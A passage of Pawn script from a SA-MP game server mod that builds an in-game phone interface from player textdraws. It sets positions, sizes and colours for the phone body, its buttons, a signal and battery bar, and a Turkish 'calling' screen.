	PlayerTextDrawSetProportional(playerid, rty[playerid][1], 0);
	PlayerTextDrawSetShadow(playerid, rty[playerid][1], 0);

	rty[playerid][2] = CreatePlayerTextDraw(playerid, 506.525787, 374.200225, "LD_POOL:ball");
	PlayerTextDrawLetterSize(playerid, rty[playerid][2], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, rty[playerid][2], 9.434350, 15.823307);
	PlayerTextDrawAlignment(playerid, rty[playerid][2], 1);
	PlayerTextDrawColor(playerid, rty[playerid][2], 255);
	PlayerTextDrawSetShadow(playerid, rty[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][2], 0);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][2], 255);
	PlayerTextDrawFont(playerid, rty[playerid][2], 4);
	PlayerTextDrawSetProportional(playerid, rty[playerid][2], 0);
	PlayerTextDrawSetShadow(playerid, rty[playerid][2], 0);

	rty[playerid][3] = CreatePlayerTextDraw(playerid, 592.022155, 201.016815, "LD_POOL:ball");
	PlayerTextDrawLetterSize(playerid, rty[playerid][3], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, rty[playerid][3], 9.434350, 15.823307);
	PlayerTextDrawAlignment(playerid, rty[playerid][3], 1);
	PlayerTextDrawColor(playerid, rty[playerid][3], 255);
	PlayerTextDrawSetShadow(playerid, rty[playerid][3], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][3], 0);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][3], 255);
	PlayerTextDrawFont(playerid, rty[playerid][3], 4);
	PlayerTextDrawSetProportional(playerid, rty[playerid][3], 0);
	PlayerTextDrawSetShadow(playerid, rty[playerid][3], 0);

	rty[playerid][4] = CreatePlayerTextDraw(playerid, 591.953491, 374.266876, "LD_POOL:ball");
	PlayerTextDrawLetterSize(playerid, rty[playerid][4], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, rty[playerid][4], 9.434350, 15.823307);
	PlayerTextDrawAlignment(playerid, rty[playerid][4], 1);
	PlayerTextDrawColor(playerid, rty[playerid][4], 255);
	PlayerTextDrawSetShadow(playerid, rty[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][4], 0);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][4], 255);
	PlayerTextDrawFont(playerid, rty[playerid][4], 4);
	PlayerTextDrawSetProportional(playerid, rty[playerid][4], 0);
	PlayerTextDrawSetShadow(playerid, rty[playerid][4], 0);

	rty[playerid][5] = CreatePlayerTextDraw(playerid, 511.110595, 226.449752, "box");
	PlayerTextDrawLetterSize(playerid, rty[playerid][5], 0.000000, 15.326469);
	PlayerTextDrawTextSize(playerid, rty[playerid][5], 596.991577, 0.000000);
	PlayerTextDrawAlignment(playerid, rty[playerid][5], 1);
	PlayerTextDrawColor(playerid, rty[playerid][5], -1);
	PlayerTextDrawUseBox(playerid, rty[playerid][5], 1);
	PlayerTextDrawBoxColor(playerid, rty[playerid][5], 1635811583);
	PlayerTextDrawSetShadow(playerid, rty[playerid][5], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][5], 0);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][5], 255);
	PlayerTextDrawFont(playerid, rty[playerid][5], 1);
	PlayerTextDrawSetProportional(playerid, rty[playerid][5], 1);
	PlayerTextDrawSetShadow(playerid, rty[playerid][5], 0);

	rty[playerid][6] = CreatePlayerTextDraw(playerid, 545.738586, 208.283294, "-----");
	PlayerTextDrawLetterSize(playerid, rty[playerid][6], 0.305826, 1.261666);
	PlayerTextDrawAlignment(playerid, rty[playerid][6], 1);
	PlayerTextDrawColor(playerid, rty[playerid][6], -2139062017);
	PlayerTextDrawSetShadow(playerid, rty[playerid][6], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][6], -4);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][6], 0);
	PlayerTextDrawFont(playerid, rty[playerid][6], 1);
	PlayerTextDrawSetProportional(playerid, rty[playerid][6], 1);
	PlayerTextDrawSetShadow(playerid, rty[playerid][6], 0);

	rty[playerid][7] = CreatePlayerTextDraw(playerid, 538.654052, 213.399917, "LD_POOL:ball");
	PlayerTextDrawLetterSize(playerid, rty[playerid][7], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, rty[playerid][7], 3.749125, 4.066679);
	PlayerTextDrawAlignment(playerid, rty[playerid][7], 1);
	PlayerTextDrawColor(playerid, rty[playerid][7], -2139062017);
	PlayerTextDrawSetShadow(playerid, rty[playerid][7], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][7], 0);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][7], 255);
	PlayerTextDrawFont(playerid, rty[playerid][7], 4);
	PlayerTextDrawSetProportional(playerid, rty[playerid][7], 0);
	PlayerTextDrawSetShadow(playerid, rty[playerid][7], 0);

	rty[playerid][8] = CreatePlayerTextDraw(playerid, 551.523559, 207.933212, "LD_POOL:ball");
	PlayerTextDrawLetterSize(playerid, rty[playerid][8], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, rty[playerid][8], 2.746540, 3.026679);
	PlayerTextDrawAlignment(playerid, rty[playerid][8], 1);
	PlayerTextDrawColor(playerid, rty[playerid][8], -2139062017);
	PlayerTextDrawSetShadow(playerid, rty[playerid][8], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][8], 0);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][8], 255);
	PlayerTextDrawFont(playerid, rty[playerid][8], 4);
	PlayerTextDrawSetProportional(playerid, rty[playerid][8], 0);
	PlayerTextDrawSetShadow(playerid, rty[playerid][8], 0);

	rty[playerid][9] = CreatePlayerTextDraw(playerid, 546.418762, 370.099822, "LD_POOL:ball");
	PlayerTextDrawLetterSize(playerid, rty[playerid][9], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, rty[playerid][9], 14.886602, 17.090002);
	PlayerTextDrawAlignment(playerid, rty[playerid][9], 1);
	PlayerTextDrawColor(playerid, rty[playerid][9], 6878207);
	PlayerTextDrawSetShadow(playerid, rty[playerid][9], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][9], 0);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][9], 255);
	PlayerTextDrawFont(playerid, rty[playerid][9], 4);
	PlayerTextDrawSetProportional(playerid, rty[playerid][9], 0);
	PlayerTextDrawSetShadow(playerid, rty[playerid][9], 0);

	rty[playerid][10] = CreatePlayerTextDraw(playerid, 519.457641, 373.299987, "LD_OTB2:butnA");
	PlayerTextDrawLetterSize(playerid, rty[playerid][10], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, rty[playerid][10], 13.742538, 14.186655);
	PlayerTextDrawAlignment(playerid, rty[playerid][10], 1);
	PlayerTextDrawColor(playerid, rty[playerid][10], 1140785232);
	PlayerTextDrawSetShadow(playerid, rty[playerid][10], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][10], 0);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][10], 255);
	PlayerTextDrawFont(playerid, rty[playerid][10], 4);
	PlayerTextDrawSetProportional(playerid, rty[playerid][10], 0);
	PlayerTextDrawSetShadow(playerid, rty[playerid][10], 0);
	PlayerTextDrawSetSelectable(playerid, rty[playerid][10], 1);

	rty[playerid][11] = CreatePlayerTextDraw(playerid, 574.539306, 373.216674, "LD_OTB2:butnA");
	PlayerTextDrawLetterSize(playerid, rty[playerid][11], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, rty[playerid][11], 13.742538, 14.186655);
	PlayerTextDrawAlignment(playerid, rty[playerid][11], 1);
	PlayerTextDrawColor(playerid, rty[playerid][11], 1996488959);
	PlayerTextDrawSetShadow(playerid, rty[playerid][11], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][11], 0);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][11], 255);
	PlayerTextDrawFont(playerid, rty[playerid][11], 4);
	PlayerTextDrawSetProportional(playerid, rty[playerid][11], 0);
	PlayerTextDrawSetShadow(playerid, rty[playerid][11], 0);
	PlayerTextDrawSetSelectable(playerid, rty[playerid][11], 1);

	rty[playerid][12] = CreatePlayerTextDraw(playerid, 511.042175, 346.384704, "altbar");
	PlayerTextDrawLetterSize(playerid, rty[playerid][12], 0.000000, 2.023838);
	PlayerTextDrawTextSize(playerid, rty[playerid][12], 597.091125, 0.000000);
	PlayerTextDrawAlignment(playerid, rty[playerid][12], 1);
	PlayerTextDrawColor(playerid, rty[playerid][12], -16776961);
	PlayerTextDrawUseBox(playerid, rty[playerid][12], 1);
	PlayerTextDrawBoxColor(playerid, rty[playerid][12], 80);
	PlayerTextDrawSetShadow(playerid, rty[playerid][12], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][12], 0);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][12], 255);
	PlayerTextDrawFont(playerid, rty[playerid][12], 1);
	PlayerTextDrawSetProportional(playerid, rty[playerid][12], 1);
	PlayerTextDrawSetShadow(playerid, rty[playerid][12], 0);

	rty[playerid][13] = CreatePlayerTextDraw(playerid, 509.073486, 224.400009, "ld_shtr:bstars");
	PlayerTextDrawLetterSize(playerid, rty[playerid][13], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, rty[playerid][13], 89.844718, 119.333091);
	PlayerTextDrawAlignment(playerid, rty[playerid][13], 1);
	PlayerTextDrawColor(playerid, rty[playerid][13], -65281);
	PlayerTextDrawSetShadow(playerid, rty[playerid][13], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][13], 0);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][13], 255);
	PlayerTextDrawFont(playerid, rty[playerid][13], 4);
	PlayerTextDrawSetProportional(playerid, rty[playerid][13], 0);
	PlayerTextDrawSetShadow(playerid, rty[playerid][13], 0);

	rty[playerid][14] = CreatePlayerTextDraw(playerid, 514.304016, 346.833221, "LD_OTB2:butnA");
	PlayerTextDrawLetterSize(playerid, rty[playerid][14], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, rty[playerid][14], 16.733669, 23.480005);
	PlayerTextDrawAlignment(playerid, rty[playerid][14], 1);
	PlayerTextDrawColor(playerid, rty[playerid][14], 9830224);
	PlayerTextDrawSetShadow(playerid, rty[playerid][14], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][14], 0);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][14], 255);
	PlayerTextDrawFont(playerid, rty[playerid][14], 4);
	PlayerTextDrawSetProportional(playerid, rty[playerid][14], 0);
	PlayerTextDrawSetShadow(playerid, rty[playerid][14], 0);

	rty[playerid][15] = CreatePlayerTextDraw(playerid, 517.458312, 351.449951, "123");
	PlayerTextDrawLetterSize(playerid, rty[playerid][15], 0.178467, 0.911665);
	PlayerTextDrawAlignment(playerid, rty[playerid][15], 1);
	PlayerTextDrawColor(playerid, rty[playerid][15], 1224736767);
	PlayerTextDrawSetShadow(playerid, rty[playerid][15], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][15], 1);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][15], 255);
	PlayerTextDrawFont(playerid, rty[playerid][15], 3);
	PlayerTextDrawSetProportional(playerid, rty[playerid][15], 1);
	PlayerTextDrawSetShadow(playerid, rty[playerid][15], 0);

	rty[playerid][16] = CreatePlayerTextDraw(playerid, 577.268249, 346.833221, "LD_OTB2:butnA");
	PlayerTextDrawLetterSize(playerid, rty[playerid][16], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, rty[playerid][16], 16.733669, 23.480005);
	PlayerTextDrawAlignment(playerid, rty[playerid][16], 1);
	PlayerTextDrawColor(playerid, rty[playerid][16], 9830224);
	PlayerTextDrawSetShadow(playerid, rty[playerid][16], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][16], 0);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][16], 255);
	PlayerTextDrawFont(playerid, rty[playerid][16], 4);
	PlayerTextDrawSetProportional(playerid, rty[playerid][16], 0);
	PlayerTextDrawSetShadow(playerid, rty[playerid][16], 0);

	rty[playerid][17] = CreatePlayerTextDraw(playerid, 580.783081, 340.300506, "...");
	PlayerTextDrawLetterSize(playerid, rty[playerid][17], 0.250728, 1.863332);
	PlayerTextDrawAlignment(playerid, rty[playerid][17], 1);
	PlayerTextDrawColor(playerid, rty[playerid][17], -1);
	PlayerTextDrawSetShadow(playerid, rty[playerid][17], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][17], 5);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][17], 0);
	PlayerTextDrawFont(playerid, rty[playerid][17], 3);
	PlayerTextDrawSetProportional(playerid, rty[playerid][17], 1);
	PlayerTextDrawSetShadow(playerid, rty[playerid][17], 0);

	rty[playerid][18] = CreatePlayerTextDraw(playerid, 580.783081, 344.900787, "...");
	PlayerTextDrawLetterSize(playerid, rty[playerid][18], 0.250728, 1.863332);
	PlayerTextDrawAlignment(playerid, rty[playerid][18], 1);
	PlayerTextDrawColor(playerid, rty[playerid][18], -1);
	PlayerTextDrawSetShadow(playerid, rty[playerid][18], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][18], 5);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][18], 0);
	PlayerTextDrawFont(playerid, rty[playerid][18], 3);
	PlayerTextDrawSetProportional(playerid, rty[playerid][18], 1);
	PlayerTextDrawSetShadow(playerid, rty[playerid][18], 0);

	rty[playerid][19] = CreatePlayerTextDraw(playerid, 556.473327, 346.833221, "LD_OTB2:butnA");
	PlayerTextDrawLetterSize(playerid, rty[playerid][19], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, rty[playerid][19], 16.733669, 23.480005);
	PlayerTextDrawAlignment(playerid, rty[playerid][19], 1);
	PlayerTextDrawColor(playerid, rty[playerid][19], 9830224);
	PlayerTextDrawSetShadow(playerid, rty[playerid][19], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][19], 0);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][19], 255);
	PlayerTextDrawFont(playerid, rty[playerid][19], 4);
	PlayerTextDrawSetProportional(playerid, rty[playerid][19], 0);
	PlayerTextDrawSetShadow(playerid, rty[playerid][19], 0);

	rty[playerid][20] = CreatePlayerTextDraw(playerid, 535.378479, 346.833221, "LD_OTB2:butnA");
	PlayerTextDrawLetterSize(playerid, rty[playerid][20], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, rty[playerid][20], 16.733669, 23.480005);
	PlayerTextDrawAlignment(playerid, rty[playerid][20], 1);
	PlayerTextDrawColor(playerid, rty[playerid][20], 9830224);
	PlayerTextDrawSetShadow(playerid, rty[playerid][20], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][20], 0);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][20], 255);
	PlayerTextDrawFont(playerid, rty[playerid][20], 4);
	PlayerTextDrawSetProportional(playerid, rty[playerid][20], 0);
	PlayerTextDrawSetShadow(playerid, rty[playerid][20], 0);

	rty[playerid][21] = CreatePlayerTextDraw(playerid, 538.953552, 351.700073, "hud:radar_RYDER");
	PlayerTextDrawLetterSize(playerid, rty[playerid][21], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, rty[playerid][21], 8.462842, 8.703289);
	PlayerTextDrawAlignment(playerid, rty[playerid][21], 1);
	PlayerTextDrawColor(playerid, rty[playerid][21], -1);
	PlayerTextDrawSetShadow(playerid, rty[playerid][21], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][21], 0);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][21], 255);
	PlayerTextDrawFont(playerid, rty[playerid][21], 4);
	PlayerTextDrawSetProportional(playerid, rty[playerid][21], 0);
	PlayerTextDrawSetShadow(playerid, rty[playerid][21], 0);

	rty[playerid][22] = CreatePlayerTextDraw(playerid, 511.005218, 226.634765, "ustbar");
	PlayerTextDrawLetterSize(playerid, rty[playerid][22], 0.000000, 0.535798);
	PlayerTextDrawTextSize(playerid, rty[playerid][22], 597.053833, 0.000000);
	PlayerTextDrawAlignment(playerid, rty[playerid][22], 1);
	PlayerTextDrawColor(playerid, rty[playerid][22], -16776961);
	PlayerTextDrawUseBox(playerid, rty[playerid][22], 1);
	PlayerTextDrawBoxColor(playerid, rty[playerid][22], -1812267184);
	PlayerTextDrawSetShadow(playerid, rty[playerid][22], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][22], 0);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][22], 255);
	PlayerTextDrawFont(playerid, rty[playerid][22], 1);
	PlayerTextDrawSetProportional(playerid, rty[playerid][22], 1);
	PlayerTextDrawSetShadow(playerid, rty[playerid][22], 0);

	rty[playerid][23] = CreatePlayerTextDraw(playerid, 595.334533, 229.983398, "box");
	PlayerTextDrawLetterSize(playerid, rty[playerid][23], 0.000000, -0.049203);
	PlayerTextDrawTextSize(playerid, rty[playerid][23], 594.895019, 0.000000);
	PlayerTextDrawAlignment(playerid, rty[playerid][23], 1);
	PlayerTextDrawColor(playerid, rty[playerid][23], -1);
	PlayerTextDrawUseBox(playerid, rty[playerid][23], 1);
	PlayerTextDrawBoxColor(playerid, rty[playerid][23], 16711935);
	PlayerTextDrawSetShadow(playerid, rty[playerid][23], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][23], 0);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][23], 255);
	PlayerTextDrawFont(playerid, rty[playerid][23], 1);
	PlayerTextDrawSetProportional(playerid, rty[playerid][23], 1);
	PlayerTextDrawSetShadow(playerid, rty[playerid][23], 0);

	rty[playerid][24] = CreatePlayerTextDraw(playerid, 595.934387, 229.083343, "box");
	PlayerTextDrawLetterSize(playerid, rty[playerid][24], 0.000000, -0.311464);
	PlayerTextDrawTextSize(playerid, rty[playerid][24], 594.175537, 0.000000);
	PlayerTextDrawAlignment(playerid, rty[playerid][24], 1);
	PlayerTextDrawColor(playerid, rty[playerid][24], -1);
	PlayerTextDrawUseBox(playerid, rty[playerid][24], 1);
	PlayerTextDrawBoxColor(playerid, rty[playerid][24], 16711935);
	PlayerTextDrawSetShadow(playerid, rty[playerid][24], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][24], 0);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][24], 255);
	PlayerTextDrawFont(playerid, rty[playerid][24], 1);
	PlayerTextDrawSetProportional(playerid, rty[playerid][24], 1);
	PlayerTextDrawSetShadow(playerid, rty[playerid][24], 0);

	rty[playerid][25] = CreatePlayerTextDraw(playerid, 586.920898, 225.399749, "%100");
	PlayerTextDrawLetterSize(playerid, rty[playerid][25], 0.096074, 0.628332);
	PlayerTextDrawAlignment(playerid, rty[playerid][25], 2);
	PlayerTextDrawColor(playerid, rty[playerid][25], -1);
	PlayerTextDrawSetShadow(playerid, rty[playerid][25], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][25], 1);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][25], 0);
	PlayerTextDrawFont(playerid, rty[playerid][25], 2);
	PlayerTextDrawSetProportional(playerid, rty[playerid][25], 1);
	PlayerTextDrawSetShadow(playerid, rty[playerid][25], 0);

	rty[playerid][26] = CreatePlayerTextDraw(playerid, 511.342285, 221.666809, ".....");
	PlayerTextDrawLetterSize(playerid, rty[playerid][26], 0.214928, 1.104166);
	PlayerTextDrawAlignment(playerid, rty[playerid][26], 1);
	PlayerTextDrawColor(playerid, rty[playerid][26], -1);
	PlayerTextDrawSetShadow(playerid, rty[playerid][26], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][26], 0);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][26], 255);
	PlayerTextDrawFont(playerid, rty[playerid][26], 1);
	PlayerTextDrawSetProportional(playerid, rty[playerid][26], 1);
	PlayerTextDrawSetShadow(playerid, rty[playerid][26], 0);

	rty[playerid][27] = CreatePlayerTextDraw(playerid, 525.197875, 226.083374, "AT&T");
	PlayerTextDrawLetterSize(playerid, rty[playerid][27], 0.091963, 0.622500);
	PlayerTextDrawAlignment(playerid, rty[playerid][27], 1);
	PlayerTextDrawColor(playerid, rty[playerid][27], -1);
	PlayerTextDrawSetShadow(playerid, rty[playerid][27], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][27], 0);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][27], 0);
	PlayerTextDrawFont(playerid, rty[playerid][27], 2);
	PlayerTextDrawSetProportional(playerid, rty[playerid][27], 1);
	PlayerTextDrawSetShadow(playerid, rty[playerid][27], 0);

	rty[playerid][28] = CreatePlayerTextDraw(playerid, 547.318420, 371.316619, "LD_NONE:light");
	PlayerTextDrawLetterSize(playerid, rty[playerid][28], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, rty[playerid][28], 13.211048, 14.583353);
	PlayerTextDrawAlignment(playerid, rty[playerid][28], 1);
	PlayerTextDrawColor(playerid, rty[playerid][28], -1);
	PlayerTextDrawSetShadow(playerid, rty[playerid][28], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][28], 0);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][28], 255);
	PlayerTextDrawFont(playerid, rty[playerid][28], 4);
	PlayerTextDrawSetProportional(playerid, rty[playerid][28], 0);
	PlayerTextDrawSetShadow(playerid, rty[playerid][28], 0);

	rty[playerid][29] = CreatePlayerTextDraw(playerid, 558.716857, 351.333251, "Mm");
	PlayerTextDrawLetterSize(playerid, rty[playerid][29], 0.211998, 1.007498);
	PlayerTextDrawAlignment(playerid, rty[playerid][29], 1);
	PlayerTextDrawColor(playerid, rty[playerid][29], -838902785);
	PlayerTextDrawSetShadow(playerid, rty[playerid][29], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][29], -1);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][29], 255);
	PlayerTextDrawFont(playerid, rty[playerid][29], 1);
	PlayerTextDrawSetProportional(playerid, rty[playerid][29], 1);
	PlayerTextDrawSetShadow(playerid, rty[playerid][29], 0);

	rty[playerid][30] = CreatePlayerTextDraw(playerid, 540.453186, 351.700073, "hud:radar_RYDER");
	PlayerTextDrawLetterSize(playerid, rty[playerid][30], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, rty[playerid][30], 8.462842, 8.703289);
	PlayerTextDrawAlignment(playerid, rty[playerid][30], 1);
	PlayerTextDrawColor(playerid, rty[playerid][30], -5298177);
	PlayerTextDrawSetShadow(playerid, rty[playerid][30], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][30], 0);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][30], 255);
	PlayerTextDrawFont(playerid, rty[playerid][30], 4);
	PlayerTextDrawSetProportional(playerid, rty[playerid][30], 0);
	PlayerTextDrawSetShadow(playerid, rty[playerid][30], 0);

	rty[playerid][31] = CreatePlayerTextDraw(playerid, 531.209899, 252.183685, "LD_OTB2:butnA");
	PlayerTextDrawLetterSize(playerid, rty[playerid][31], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, rty[playerid][31], 44.326416, 67.040107);
	PlayerTextDrawAlignment(playerid, rty[playerid][31], 1);
	PlayerTextDrawColor(playerid, rty[playerid][31], -6160272);
	PlayerTextDrawSetShadow(playerid, rty[playerid][31], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][31], 0);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][31], 255);
	PlayerTextDrawFont(playerid, rty[playerid][31], 4);
	PlayerTextDrawSetProportional(playerid, rty[playerid][31], 0);
	PlayerTextDrawSetShadow(playerid, rty[playerid][31], 0);

	rty[playerid][32] = CreatePlayerTextDraw(playerid, 524.835388, 241.533355, "LD_OTB2:Ric2");
	PlayerTextDrawLetterSize(playerid, rty[playerid][32], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, rty[playerid][32], 58.709068, 78.966720);
	PlayerTextDrawAlignment(playerid, rty[playerid][32], 1);
	PlayerTextDrawColor(playerid, rty[playerid][32], 255);
	PlayerTextDrawSetShadow(playerid, rty[playerid][32], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][32], 0);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][32], 255);
	PlayerTextDrawFont(playerid, rty[playerid][32], 4);
	PlayerTextDrawSetProportional(playerid, rty[playerid][32], 0);
	PlayerTextDrawSetShadow(playerid, rty[playerid][32], 0);

	rty[playerid][33] = CreatePlayerTextDraw(playerid, 553.828735, 241.199890, "ARIYOR");
	PlayerTextDrawLetterSize(playerid, rty[playerid][33], 0.224304, 1.034165);
	PlayerTextDrawAlignment(playerid, rty[playerid][33], 2);
	PlayerTextDrawColor(playerid, rty[playerid][33], -1);
	PlayerTextDrawSetShadow(playerid, rty[playerid][33], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][33], 7);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][33], 0);
	PlayerTextDrawFont(playerid, rty[playerid][33], 1);
	PlayerTextDrawSetProportional(playerid, rty[playerid][33], 1);
	PlayerTextDrawSetShadow(playerid, rty[playerid][33], 0);

	rty[playerid][34] = CreatePlayerTextDraw(playerid, 553.252563, 305.616729, "Steve_Jobs~n~687157");
	PlayerTextDrawLetterSize(playerid, rty[playerid][34], 0.191003, 0.920831);
	PlayerTextDrawAlignment(playerid, rty[playerid][34], 2);
	PlayerTextDrawColor(playerid, rty[playerid][34], -1);
	PlayerTextDrawSetShadow(playerid, rty[playerid][34], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][34], 2);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][34], 0);
	PlayerTextDrawFont(playerid, rty[playerid][34], 1);
	PlayerTextDrawSetProportional(playerid, rty[playerid][34], 1);
	PlayerTextDrawSetShadow(playerid, rty[playerid][34], 0);

	rty[playerid][35] = CreatePlayerTextDraw(playerid, 523.392333, 375.016693, "K________________R");
	PlayerTextDrawLetterSize(playerid, rty[playerid][35], 0.214465, 0.719166);
	PlayerTextDrawAlignment(playerid, rty[playerid][35], 1);
	PlayerTextDrawColor(playerid, rty[playerid][35], -1);
	PlayerTextDrawSetShadow(playerid, rty[playerid][35], 0);
	PlayerTextDrawSetOutline(playerid, rty[playerid][35], 0);
	PlayerTextDrawBackgroundColor(playerid, rty[playerid][35], 255);
	PlayerTextDrawFont(playerid, rty[playerid][35], 1);
	PlayerTextDrawSetProportional(playerid, rty[playerid][35], 1);
	PlayerTextDrawSetShadow(playerid, rty[playerid][35], 0);

	qwe[playerid][0] = CreatePlayerTextDraw(playerid, 506.757385, 201.083328, "ld_poke:cd1d");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][0], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, qwe[playerid][0], 94.685211, 189.166671);
	PlayerTextDrawAlignment(playerid, qwe[playerid][0], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][0], 255);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][0], 0);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][0], 255);
	PlayerTextDrawFont(playerid, qwe[playerid][0], 4);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][0], 0);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][0], 0);

	qwe[playerid][1] = CreatePlayerTextDraw(playerid, 506.657165, 200.883346, "LD_POOL:ball");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][1], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, qwe[playerid][1], 9.434350, 15.823307);
	PlayerTextDrawAlignment(playerid, qwe[playerid][1], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][1], 255);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][1], 0);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][1], 255);
	PlayerTextDrawFont(playerid, qwe[playerid][1], 4);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][1], 0);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][1], 0);

	qwe[playerid][2] = CreatePlayerTextDraw(playerid, 506.525787, 374.200225, "LD_POOL:ball");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][2], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, qwe[playerid][2], 9.434350, 15.823307);
	PlayerTextDrawAlignment(playerid, qwe[playerid][2], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][2], 255);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][2], 0);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][2], 255);
	PlayerTextDrawFont(playerid, qwe[playerid][2], 4);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][2], 0);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][2], 0);

	qwe[playerid][3] = CreatePlayerTextDraw(playerid, 592.022155, 201.016815, "LD_POOL:ball");
	PlayerTextDrawLetterSize(playerid, qwe[playerid][3], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, qwe[playerid][3], 9.434350, 15.823307);
	PlayerTextDrawAlignment(playerid, qwe[playerid][3], 1);
	PlayerTextDrawColor(playerid, qwe[playerid][3], 255);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][3], 0);
	PlayerTextDrawSetOutline(playerid, qwe[playerid][3], 0);
	PlayerTextDrawBackgroundColor(playerid, qwe[playerid][3], 255);
	PlayerTextDrawFont(playerid, qwe[playerid][3], 4);
	PlayerTextDrawSetProportional(playerid, qwe[playerid][3], 0);
	PlayerTextDrawSetShadow(playerid, qwe[playerid][3], 0);

